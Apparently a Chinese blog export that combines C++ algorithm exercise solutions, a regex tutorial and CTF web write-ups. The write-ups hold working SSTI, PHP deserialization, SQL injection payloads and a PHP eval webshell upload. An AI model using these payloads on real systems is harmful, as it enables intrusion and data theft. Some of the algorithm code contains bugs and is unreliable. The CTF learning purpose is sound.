输入多组测试用例。第一行输入包含一个整数T（1&lt;=T&lt;=10），代表测试用例个数。 接下来有T组测试用例。每组测试用例第一行为盾山承受盾牌的最大重量C(C&lt;10000)和小石头的个数N(N&lt;1000)。接下来的N行分别为小石头的重量Wi(1&lt;=Wi&lt;=100)和防御值Pi(1&lt;=Pi&lt;=3000000)。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表可承受盾牌的最大防御值。 样例输入1 10 5 2 6 2 3 6 5 5 4 4 6 样例输出15 提示01背包问题，不知道下面的解能不能过 #include&lt;bits/stdc++.h&gt; using namespace std; const int N=1e5+5; long long ans[N]; int w[N],v[N]; int T; int main() &#123; cin&gt;&gt;T; while(T--) &#123; int C,N; memset(ans,0,sizeof(ans)); cin&gt;&gt;C&gt;&gt;N; for(int i=0;i&lt;N;i++) &#123; cin&gt;&gt;w[i]&gt;&gt;v[i]; &#125; for(int i=0;i&lt;N;i++) &#123; for(int j=C;j&gt;=w[i];j--) ans[j]=max(ans[j-1],ans[j-w[i]]+v[i]); &#125; // for(int i=0;i&lt;=C;i++) // cout&lt;&lt;ans[i]&lt;&lt;endl; cout&lt;&lt;ans[C]&lt;&lt;endl; &#125; return 0; &#125; ps:以上代码没有提交测试环境，只是过了给出的测试样例。 dfs大合集迷宫问题题目描述小明置身于一个迷宫，请你帮小明找出从起点到终点的最短路程。小明只能向上下左右四个方向移动。 输入 输入包含多组测试数据。输入的第一行是一个整数T，表示有T组测试数据。每组输入的第一行是两个整数N和M（1&lt;=N,M&lt;=100）。接下来N行，每行输入M个字符，每个字符表示迷宫中的一个小方格。字符的含义如下：‘S’：起点‘E’：终点‘-’：空地，可以通过‘#’：障碍，无法通过输入数据保证有且仅有一个起点和终点。 输出 对于每组输入，输出从起点到终点的最短路程，如果不存在从起点到终点的路，则输出-1。 样例输入1 5 5 s-### ----- ##--- E#--- ---## 样例输出9 #include&lt;iostream&gt; #include&lt;cstring&gt; #include&lt;string&gt; #include&lt;queue&gt; #include &lt;algorithm&gt; using namespace std; int de[100][100];//计步数组 记录走到这个位置所需的步数 不能走到的位置标记为-1 char map[100][100]; //用于存放迷宫地图 typedef pair&lt;int,int&gt; P; //坐标 int to[2][4]=&#123;1,-1,0,0,0,0,1,-1&#125;; //在当前坐标下能走的四个方向 int sx,ex,sy,ey; //(sx,sy)为起点坐标 （ex,ey）为终点坐标 int x,y,nx,ny; //(x,y)为函数中当前位置坐标 （nx,ny)为接下来能到达的坐标 int r,l; //r为行数 l为列数 int bfs() &#123; memset(de,-1,sizeof(de)); queue&lt;P&gt; qu; qu.push(P(sx,sy)); //将起点坐标放入队头 de[sx][sy]=0; while(!qu.empty()) &#123; P p=qu.front(); //取出队头坐标 qu.pop() ;//删除对头及走过的坐标 x=p.first,y=p.second; if(x==ex&amp;&amp;y==ey) break; //到达终点 跳出循环 for(int i=0;i&lt;4;i++) &#123; nx=x+to[0][i];//开始向四个方向移动 ny=y+to[1][i]; if(nx&gt;=0&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=0&amp;&amp;ny&lt;l&amp;&amp;map[nx][ny]!=&#x27;#&#x27;&amp;&amp;de[nx][ny]==-1) //判断是否越界 以及是否能走 排除走过的路 &#123; qu.push(P(nx,ny)); //将能走的坐标放入队列 之后依次删除 de[nx][ny]=de[x][y]+1; //步数加一 &#125; &#125; &#125; if(de[ex][ey]==-1) return -1; //终点的记步数组为-1 及不能到达终点 else return de[ex][ey]; &#125; int main() &#123; int n,i,j; while(cin&gt;&gt;n)&#123; while(n--)&#123; cin&gt;&gt;r&gt;&gt;l; for(i=0;i&lt;r;i++)&#123; for(j=0;j&lt;l;j++)&#123; cin&gt;&gt;map[i][j]; if(map[i][j]==&#x27;S&#x27;) //记录起点坐标 &#123; sx=i,sy=j; &#125; else if(map[i][j]==&#x27;T&#x27;) //记录终点坐标 &#123; ex=i,ey=j; &#125; &#125; &#125; cout&lt;&lt;bfs()&lt;&lt;endl; &#125; &#125; return 0; &#125; acwing迷宫问题#include&lt;bits/stdc++.h&gt; using namespace std; const int N=105; int mp[N][N]; int dis[N][N]; typedef pair&lt;int,int&gt; P; int n,m; int to[2][4]=&#123;1,-1,0,0,0,0,1,-1&#125;; int x,y,nx,ny; void dfs() &#123; memset(dis,-1,sizeof(dis)); queue&lt;P&gt; qu; qu.push(P(0,0)); dis[0][0]=0; while(!qu.empty()) &#123; P p=qu.front(); qu.pop(); x=p.first,y=p.second; if(x==n-1&amp;&amp;y==m-1) break; for(int i=0;i&lt;4;i++) &#123; nx=x+to[0][i],ny=y+to[1][i]; if(nx&gt;=0&amp;&amp;nx&lt;n&amp;&amp;ny&gt;=0&amp;&amp;ny&lt;m&amp;&amp;dis[nx][ny]==-1&amp;&amp;mp[nx][ny]==0) &#123; qu.push(P(nx,ny)); dis[nx][ny]=dis[x][y]+1; &#125; &#125; &#125; if(dis[n-1][m-1]!=-1) cout&lt;&lt;dis[n-1][m-1]; return; &#125; int main() &#123; cin&gt;&gt;n&gt;&gt;m; for(int i=0;i&lt;n;i++) for(int j=0;j&lt;m;j++) cin&gt;&gt;mp[i][j]; dfs(); return 0; &#125; n皇后问题#include&lt;bits/stdc++.h&gt; using namespace std; int n,ans=0; const int N=20; char m[N][N]; bool col[N],dg[N],udg[N]; void dfs(int u) &#123; if(u==n) &#123; // for(int i=0;i&lt;n;i++) // cout&lt;&lt;m[i]&lt;&lt;endl; ans++; return; &#125; for(int i=0;i&lt;n;i++) &#123; if(!col[i]&amp;&amp;!dg[i+u]&amp;&amp;!udg[n-u+i]) &#123; m[u][i]=&#x27;Q&#x27;; col[i]=dg[i+u]=udg[n-u+i]=1; dfs(u+1); col[i]=dg[i+u]=udg[n-u+i]=0;//回溯恢复现场 m[u][i]=&#x27;.&#x27;; &#125; &#125; &#125; int main() &#123; cin&gt;&gt;n; for(int i=0;i&lt;n;i++) for(int j=0;j&lt;n;j++) m[i][j]=&#x27;.&#x27;; dfs(0); cout&lt;&lt;ans; return 0; &#125; m图着色问题题目描述给定无向连通图G和m种不同的颜色，用这些颜色给图的各个顶点着一种颜色，若某种方案使得图中每条边的2个顶点的颜色都不相同，则是一个满足的方案，找出所有的方案。 输入第一行有3个正整数n，k和m，分别表示n个顶点，k条边，m种颜色接下来k行，每行2个正整数，表示一条边的两个顶点 输出所有不同的着色方案数 样例输入5 8 4 1 2 1 3 1 4 2 3 2 4 2 5 3 4 4 5 样例输出48 提示#include&lt;bits/stdc++.h&gt; using namespace std; const int N=105; int mp[N][N]; int color[N]=&#123;0&#125;; int n,k,m,ans=0; void dfs(int d) &#123; if(d==n+1) &#123; ans++; return; &#125; for(int i=1;i&lt;=m;i++) &#123; int flag=1; for(int j=1;j&lt;=n;j++) &#123; if(mp[d][j]&amp;&amp;color[j]==i) &#123; flag=0; break; &#125; &#125; if(flag) &#123; color[d]=i; dfs(d+1); color[d]=0; &#125; &#125; &#125; int main() &#123; cin&gt;&gt;n&gt;&gt;k&gt;&gt;m; for(int i=0;i&lt;k;i++) &#123; int t1,t2; cin&gt;&gt;t1&gt;&gt;t2; mp[t1][t2]=1; mp[t2][t1]=1; &#125; dfs(1); cout&lt;&lt;ans&lt;&lt;endl; return 0; &#125; 部分和题目描述给定n个整数，判断是否可以从中选择若干数字，使得他们的和恰好为k。 输入多组测试用例。 对于每组测试用例，第一行一个正整数n，第二行n个整数，第三行一个整数k。 1*≤N≤*20，输入整数及k均小于1e8。 输出若可以使得和为k，输出”Yes”,否则”No”。 样例输入4 1 2 4 7 13 样例输出Yes #include&lt;bits/stdc++.h&gt; using namespace std; int s[25]; int n,m; bool check(int l,int a) &#123; if(a==m) return true; if(l==n) return false; if(check(l+1,a+s[l])) return true; if(check(l+1,a)) return true; &#125; int main() &#123; cin&gt;&gt;n; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;s[i]; &#125; cin&gt;&gt;m; if(check(0,0)) cout&lt;&lt;&quot;YES&quot;; else cout&lt;&lt;&quot;NO&quot;; return 0; &#125;","tags":[]},{"title":"正则表达式","date":"2020-11-01T13:31:31.000Z","path":"2020/11/01/preg/","text":"在一些代码审计的题目当中经常会出现使用正则表达过滤字符串的情况，所以有必要系统的学习一下！ 什么是正则表达式详情见这 菜鸡教程中介绍的很详细。 特殊字符许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符”转义”，即，将反斜杠字符\\ 放在它们前面。下表列出了正则表达式中的特殊字符： 特别字符 描述 $ 匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\\n’ 或 ‘\\r’。要匹配 $ 字符本身，请使用 \\$。 ( ) 标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 ( 和 )。 * 匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 \\*。 + 匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 \\+。 . 匹配除换行符 \\n 之外的任何单字符。要匹配 . ，请使用 \\. 。 [ 标记一个中括号表达式的开始。要匹配 [，请使用\\[。 ? 匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 ?。 \\ 将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\\n’ 匹配换行符。序列 ‘\\‘ 匹配 “&quot;，而 ‘(‘ 则匹配 “(“。 ^ 匹配输入字符串的开始位置，除非在方括号表达式中使用，当该符号在方括号表达式中使用时，表示不接受该方括号表达式中的字符集合。要匹配 ^ 字符本身，请使用 ^。 { 标记限定符表达式的开始。要匹配 {，请使用 \\{。 | 指明两项之间的一个选择。要匹配 |，请使用 \\ 限定符限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 *** 或 **+ 或 ? 或 {n} 或 {n,} 或 {n,m} 共6种。 正则表达式的限定符有： 字符 描述 * 匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。 + 匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。 ? 匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。 {n} n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。 {n,} n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。 {n,m} m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。 常用的正则表达式及含义参考 一、校验数字的表达式 1. 数字：^[0-9]*$ // ^表示字符的开始，$表示结束 [0-9] 表示字符串中的字符在0-9中 2. n位的数字：^\\d&#123;n&#125;$ // \\d与[0-9]等价 ，&#123;n&#125; n表示匹配n次，所以表示匹配n位数 3. 至少n位的数字：^\\d&#123;n,&#125;$ //&#123;n,&#125;至少n次 4. m-n位的数字：^\\d&#123;m,n&#125;$ //&#123;n,m&#125; n-m次 5. 零和非零开头的数字：^(0|[1-9][0-9]*)$ // | 是或者意思，表示匹配左右两个子表达式其中一个都可以 6. 非零开头的最多带两位小数的数字：^([1-9][0-9]*)+(.[0-9]&#123;1,2&#125;)?$ // +匹配前面的表达式一次或多次 (.[0-9]&#123;1,2&#125;)? 表示匹配 (.[0-9]&#123;1,2&#125;)一次或零次这子表达式代表的是0.[1-9]或者0.[0-9][1-9] 7. 带1-2位小数的正数或负数：^(\\-)?\\d+(\\.\\d&#123;1,2&#125;)?$ // (\\-)? 匹配一次或零次负号 8. 正数、负数、和小数：^(\\-|\\+)?\\d+(\\.\\d+)?$ // \\- \\+ \\.是将特殊字符转义 9. 有两位小数的正实数：^[0-9]+(.[0-9]&#123;2&#125;)?$ 10. 有1~3位小数的正实数：^[0-9]+(.[0-9]&#123;1,3&#125;)?$ 11. 非零的正整数：^[1-9]\\d*$ 或 ^([1-9][0-9]*)&#123;1,3&#125;$ 或 ^\\+?[1-9][0-9]*$ // [1-9] 控制非零 12. 非零的负整数：^\\-[1-9][]0-9&quot;*$ 或 ^-[1-9]\\d*$ //一下的表达式的含义可以以此类推（感觉不是很常用） 13. 非负整数：^\\d+$ 或 ^[1-9]\\d*|0$ 14. 非正整数：^-[1-9]\\d*|0$ 或 ^((-\\d+)|(0+))$ 15. 非负浮点数：^\\d+(\\.\\d+)?$ 或 ^[1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*|0?\\.0+|0$ 16. 非正浮点数：^((-\\d+(\\.\\d+)?)|(0+(\\.0+)?))$ 或 ^(-([1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*))|0?\\.0+|0$ 17. 正浮点数：^[1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*$ 或 ^(([0-9]+\\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\\.[0-9]+)|([0-9]*[1-9][0-9]*))$ 18. 负浮点数：^-([1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*)$ 或 ^(-(([0-9]+\\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\\.[0-9]+)|([0-9]*[1-9][0-9]*)))$ 19. 浮点数：^(-?\\d+)(\\.\\d+)?$ 或 ^-?([1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*|0?\\.0+|0)$ 二、校验字符的表达式 1. 汉字：^[\\u4e00-\\u9fa5]&#123;0,&#125;$ //u4e00是unicode中第一个汉字编码 u9fa5是最后一个 2. 英文和数字：^[A-Za-z0-9]+$ 或 ^[A-Za-z0-9]&#123;4,40&#125;$ //[A-Za-z0-9]可以匹配大小写字母数字 3. 长度为3-20的所有字符：^.&#123;3,20&#125;$ // .代表任意字符包括换行符 4. 由26个英文字母组成的字符串：^[A-Za-z]+$ 5. 由26个大写英文字母组成的字符串：^[A-Z]+$ 6. 由26个小写英文字母组成的字符串：^[a-z]+$ 7. 由数字和26个英文字母组成的字符串：^[A-Za-z0-9]+$ //与第二个表达式相同 8. 由数字、26个英文字母或者下划线组成的字符串：^\\w+$ 或 ^\\w&#123;3,20&#125;$ // \\w=[0-9A-Za-z_] 9. 中文、英文、数字包括下划线：^[\\u4E00-\\u9FA5A-Za-z0-9_]+$ 10. 中文、英文、数字但不包括下划线等符号：^[\\u4E00-\\u9FA5A-Za-z0-9]+$ 或 ^[\\u4E00-\\u9FA5A-Za-z0-9]&#123;2,20&#125;$ 11. 可以输入含有^%&amp;&#x27;,;=?$\\&quot;等字符：[^%&amp;&#x27;,;=?$\\x22]+ 12 禁止输入含有~的字符：[^~\\x22]+ //这里的 ^是非的意思 下面这些就不一一解释了，实在太多了有的还是重复。 三、特殊需求表达式 1. Email地址：^\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)*$ 2. 域名：[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(/.[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;)+/.? 3. InternetURL：[a-zA-z]+://[^\\s]* 或 ^http://([\\w-]+\\.)+[\\w-]+(/[\\w-./?%&amp;=]*)?$ 4. 手机号码：^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\\d&#123;8&#125;$ 5. 电话号码(&quot;XXX-XXXXXXX&quot;、&quot;XXXX-XXXXXXXX&quot;、&quot;XXX-XXXXXXX&quot;、&quot;XXX-XXXXXXXX&quot;、&quot;XXXXXXX&quot;和&quot;XXXXXXXX)：^(\\(\\d&#123;3,4&#125;-)|\\d&#123;3.4&#125;-)?\\d&#123;7,8&#125;$ 6. 国内电话号码(0511-4405222、021-87888822)：\\d&#123;3&#125;-\\d&#123;8&#125;|\\d&#123;4&#125;-\\d&#123;7&#125; 7. 身份证号(15位、18位数字)：^\\d&#123;15&#125;|\\d&#123;18&#125;$ 8. 短身份证号码(数字、字母x结尾)：^([0-9])&#123;7,18&#125;(x|X)?$ 或 ^\\d&#123;8,18&#125;|[0-9x]&#123;8,18&#125;|[0-9X]&#123;8,18&#125;?$ 9. 帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]&#123;4,15&#125;$ 10. 密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：^[a-zA-Z]\\w&#123;5,17&#125;$ 11. 强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间)：^(?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).&#123;8,10&#125;$ 12. 日期格式：^\\d&#123;4&#125;-\\d&#123;1,2&#125;-\\d&#123;1,2&#125; 13. 一年的12个月(01～09和1～12)：^(0?[1-9]|1[0-2])$ 14. 一个月的31天(01～09和1～31)：^((0?[1-9])|((1|2)[0-9])|30|31)$ 14 钱的输入格式： 15 1.有四种钱的表示形式我们可以接受:&quot;10000.00&quot; 和 &quot;10,000.00&quot;, 和没有 &quot;分&quot; 的 &quot;10000&quot; 和 &quot;10,000&quot;：^[1-9][0-9]*$ 16 2.这表示任意一个不以0开头的数字,但是,这也意味着一个字符&quot;0&quot;不通过,所以我们采用下面的形式：^(0|[1-9][0-9]*)$ 17 3.一个0或者一个不以0开头的数字.我们还可以允许开头有一个负号：^(0|-?[1-9][0-9]*)$ 18 4.这表示一个0或者一个可能为负的开头不为0的数字.让用户以0开头好了.把负号的也去掉,因为钱总不能是负的吧.下面我们要加的是说明可能的小数部分：^[0-9]+(.[0-9]+)?$ 19 5.必须说明的是,小数点后面至少应该有1位数,所以&quot;10.&quot;是不通过的,但是 &quot;10&quot; 和 &quot;10.2&quot; 是通过的：^[0-9]+(.[0-9]&#123;2&#125;)?$ 20 6.这样我们规定小数点后面必须有两位,如果你认为太苛刻了,可以这样：^[0-9]+(.[0-9]&#123;1,2&#125;)?$ 21 7.这样就允许用户只写一位小数.下面我们该考虑数字中的逗号了,我们可以这样：^[0-9]&#123;1,3&#125;(,[0-9]&#123;3&#125;)*(.[0-9]&#123;1,2&#125;)?$ 22 8.1到3个数字,后面跟着任意个 逗号+3个数字,逗号成为可选,而不是必须：^([0-9]+|[0-9]&#123;1,3&#125;(,[0-9]&#123;3&#125;)*)(.[0-9]&#123;1,2&#125;)?$ 23 备注：这就是最终结果了,别忘了&quot;+&quot;可以用&quot;*&quot;替代如果你觉得空字符串也可以接受的话(奇怪,为什么?)最后,别忘了在用函数时去掉去掉那个反斜杠,一般的错误都在这里 24 xml文件：^([a-zA-Z]+-?)+[a-zA-Z0-9]+\\\\.[x|X][m|M][l|L]$ 25 中文字符的正则表达式：[\\u4e00-\\u9fa5] 26 双字节字符：[^\\x00-\\xff] (包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计2，ASCII字符计1)) 27 空白行的正则表达式：\\n\\s*\\r (可以用来删除空白行) 28 HTML标记的正则表达式：&lt;(\\S*?)[^&gt;]*&gt;.*?&lt;/\\1&gt;|&lt;.*? /&gt; (网上流传的版本太糟糕，上面这个也仅仅能部分，对于复杂的嵌套标记依旧无能为力) 29 首尾空白字符的正则表达式：^\\s*|\\s*$或(^\\s*)|(\\s*$) (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式) 30 腾讯QQ号：[1-9][0-9]&#123;4,&#125; (腾讯QQ号从10000开始) 31 中国邮政编码：[1-9]\\d&#123;5&#125;(?!\\d) (中国邮政编码为6位数字) 32 IP地址：\\d+\\.\\d+\\.\\d+\\.\\d+ (提取IP地址时有用) 33 IP地址：((?:(?:25[0-5]|2[0-4]\\\\d|[01]?\\\\d?\\\\d)\\\\.)&#123;3&#125;(?:25[0-5]|2[0-4]\\\\d|[01]?\\\\d?\\\\d)) 34 将url的协议，主机名，端口号，文件路径放到数组中: var str = &quot;http://www.runoob.com:80/html/html-tutorial.html&quot;; var patt1 = /(\\w+):\\/\\/([^/:]+)(:\\d*)?([^# ]*)/; //四个子表达式组合在一起，(\\w+): 匹配字符串开始到: ([^/:]+) 匹配非/ 非:后的内容 (:\\d*)? 匹配:后的若干数字且表达式重复一次或多次 ([^# ]*) 匹配不包括#或空格字符的任何字符序列 总结正则表达式的功能还是很强大的，想要写出能准确匹配目标的表达式还是需要认真学习的，但是代码审计中的要求没那么严格，只需要能看懂表达式匹配了哪些内容即可。","tags":[]},{"title":"cumt华为杯","date":"2020-10-28T12:26:38.000Z","path":"2020/10/28/华为杯/","text":"cumt_华为杯经典的学长虐菜局，web只做出来一个，另外两题好不容易有思路了，都被卡死了 webdoge真签到题，抽个奖就给出了flag babyflask刚进入页面，只有一张图片，查看源码也没发现什么 就是了模板注入 url+&#123;&#123;7*7&#125;&#125;Copy 页面出现404报错，并且显示的是url+49，确定是模板注入 &#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()&#125;&#125; 查看模块时，发现存在waf 经过测试发现是过滤了[] 于是使用 &#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__()&#125;&#125; 存在file模块 用read读取文件内容 exp: &#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag&#x27;).read()Copy 参考链接：https://xz.aliyun.com/t/8029 VulnCMS这题是真滴无语，开始以为是XSS，后来学长提示不是，又找到了文件上传的漏洞，直接拿到了网站根目录本以为做出了，结果提示flag not here,心态炸裂，但是提示了”投个稿？“，应该是在投稿位置下功夫吧。到最后也没做出了，但是找到了漏洞代码，应该是sql注入。 这里给出大神的做法 Hodor这题基本上是原题，但是加了一层过滤，怎么都没绕过去。。。 看到WP是大S绕过，涨知识了 &lt;?php Class Source &#123; public function __toString() &#123; return highlight_file(&#x27;license.txt&#x27;, true).highlight_file($this-&gt;source, true); &#125; &#125; function easy_check($str) &#123; //echo $str; if (preg_match(&quot;/flag/i&quot;, $str, $matches)) &#123; return false; &#125; return true; &#125; if(isset($_GET[&#x27;source&#x27;]))&#123; $s = new Source(); $s-&gt;source = __FILE__; echo $s; exit; &#125; $todos = []; if(isset($_COOKIE[&#x27;todos&#x27;]))&#123; if(!easy_check($_COOKIE[&#x27;todos&#x27;])) &#123; echo &quot;Hacker!\\n&quot;; &#125; else &#123; $c = $_COOKIE[&#x27;todos&#x27;]; $h = substr($c, 0, 32); $m = substr($c, 32); if(md5($m) === $h)&#123; $todos = unserialize($m); &#125; &#125; &#125; if(isset($_POST[&#x27;text&#x27;]))&#123; $todo = $_POST[&#x27;text&#x27;]; $todos[] = $todo; $m = serialize($todos); $h = md5($m); setcookie(&#x27;todos&#x27;, $h.$m); header(&#x27;Location: &#x27;.$_SERVER[&#x27;REQUEST_URI&#x27;]); exit; &#125; // flag is in flag.php ?Copy exp echo md5(&#x27;a:2:&#123;i:0;s:3:&quot;123&quot;;i:1;O:6:&quot;Source&quot;:1: &#123;s:6:&quot;source&quot;;S:8:&quot;\\66lag.php&quot;;&#125;&#125;&#x27;); echo urlencode(&#x27;ae5860e508aaf353a9ad78ac246f46fba:2: &#123;i:0;s:3:&quot;123&quot;;i:1;O:6:&quot;Source&quot;:1:&#123;s:6:&quot;source&quot;;S:8:&quot;\\66lag.php&quot;;&#125;&#125;&#x27;);Copy 参考 https://blog.csdn.net/SmileAndFun/article/details/108497183 webcms是一个博客管理的网站，其实也是个原题，考察点是文件上传 漏洞点在图片中上传图片的位置 随便上传一张图片试试，抓包结果如下，几个注意点 1.filetype规定了文件的类型 2.上传时，将图片保存为了base64形式 所以上传一句话木马的时候要注意修改对应的位置 一句话木马类型为php,则filetype改为php 内容为密码为cmd一句话木马，对应的base64编码PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg== 上传成功，访问保存的路径：http://219.219.61.234:20203/upload/tmp/1_Y2R8AK57UWV4JBW.php POST: cmd=system(&quot;cat /flag&quot;); 或者蚁剑连接，密码cmdCopy MiscMIsc部分基本都是队友做的，好像也不是太难 伪web真是伪web。。。 直接在文件里搜索就能到flag 搜索关键词cmut，flag所在文件夹为html\\include\\include.php","tags":[{"name":"unserialize","slug":"unserialize","permalink":"https://sunzhengyu99.github.io/tags/unserialize/"},{"name":"ssti","slug":"ssti","permalink":"https://sunzhengyu99.github.io/tags/ssti/"},{"name":"文件上传","slug":"文件上传","permalink":"https://sunzhengyu99.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"buuctf-LFI","date":"2020-10-08T12:35:05.000Z","path":"2020/10/08/buuoj-LFI/","text":"","tags":[{"name":"LFI","slug":"LFI","permalink":"https://sunzhengyu99.github.io/tags/LFI/"}]},{"title":"buuctf-sql注入","date":"2020-10-05T10:29:30.000Z","path":"2020/10/05/buuoj/","text":"buuctf–注入篇 [CISCN2019 华北赛区 Day2 Web1]Hack World给了提示，All You Want Is In Table &#39;flag&#39; and the column is &#39;flag&#39; 猜测flag在flag 表中，查询语句应该是 select flag from flag 经过测试，发现这题过滤了很多关键字，or,union,order等，猜测是盲注 构造盲注语句 id=if((ascii(substr((select(flag)from(flag)),0,1))&gt;90),1,2) 两次的提示语句不一样，说明这个注入语句是对的，且当提示Hello时应该是对的。 // 二分注入 import requests url = &quot;http://376688f4-59c4-4f47-8d0e-36c966e45631.node3.buuoj.cn/index.php&quot; data = &#123;id : &quot;&quot;&#125; flag = &quot;&quot; for i in range(50): left = 33 right = 128 mid = (right + left) &gt;&gt; 1 while(right&gt;left): data[&quot;id&quot;] = &quot;if((ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;),1,2)&quot;.format(i,mid) response = requests.post(url,data=data) if &quot;Hello&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 flag = flag + chr(mid) print(flag) print(flag) [极客大挑战 2019]HardSQL报错注入 测试发现or,union,substr,空格,/**/等都被加入黑名单，双写也无法绕过 可是使用报错注入 报错注入原理： 其原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；第二次是假设group by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。 相关链接 https://www.cnblogs.com/richardlee97/p/10617115.html https://www.jianshu.com/p/d8ae3e8dabdc https://blog.csdn.net/qq_37873738/article/details/88042610 UPDATEXML (XML_document, XPath_string, new_value);第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串) 。第三个参数：new_value，String格式，替换查找到的符合条件的数据 查询语句如下 ?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23 ?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))%23 ?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23 这里会发现flag显示不全，可能是报错现实的字数限制，利用right/left函数，显示部分的flag，之后拼接起来 显示后面的flag ?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1)),0x7e),1))%23 [网鼎杯 2018]Fakebooksql注入+反序列化+代码审计 [GXYCTF2019]BabySQli下载的源码，有助于后面做题 mysqli_query($con,&#x27;SET NAMES UTF8&#x27;); $name = $_POST[&#x27;name&#x27;]; $password = $_POST[&#x27;pw&#x27;]; $t_pw = md5($password); //对传入的password参数进行了md5加密 $sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;; // echo $sql; $result = mysqli_query($con, $sql); if(preg_match(&quot;/\\(|\\)|\\=|or/&quot;, $name))&#123; // 过滤了() | = or die(&quot;do not hack me!&quot;); &#125; else&#123; if (!$result) &#123; printf(&quot;Error: %s\\n&quot;, mysqli_error($con)); exit(); &#125; else&#123; // echo &#x27;&lt;pre&gt;&#x27;; $arr = mysqli_fetch_row($result); // print_r($arr); if($arr[1] == &quot;admin&quot;)&#123; if(md5($password) == $arr[2])&#123; // echo $flag; &#125; else&#123; die(&quot;wrong pass!&quot;); &#125; &#125; else&#123; die(&quot;wrong user!&quot;); &#125; &#125; &#125; 随便输入用户名和密码，查看源码，出现提示 试了试应该是base32，解码后是base64 c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw== 继续解码 select * from user where username = &#x27;$name&#x27; 注入点是name参数这里，与上面源码中的查询语句一样。 经过测试发现有三列，name=admin&#39; union select 1,2,3 #&amp;pw=as#显示正常，name=admn&#39; union select 1,2,3,4#&amp;pw=as报错 但是页面没有数字回显，所以常规的注入应该是不行的。 值得注意的是，这题可以知道username是admin， 输入username=admin&amp;password=11,时提示wrong pass! 输入username=admn&amp;password=11,时提示wrong user!，所以可以判断用户名为admin 接下来介绍一种新的union注入 先建立一张表 select * from test where id=0 union select 1,&#x27;admin&#x27;,&#x27;2322&#x27;; union语句后查询的是表中不存在的一个数据，查询结果如下 这个结果说明，union查询一个不存在的数据时，会建立一个虚拟表，其中放着所查询到的数据和union后包含的数据 这里就是 id=1,username=admin,password=2322 这样就可以利用这个改变数据库中用户的密码，然后用自己设置的密码登录 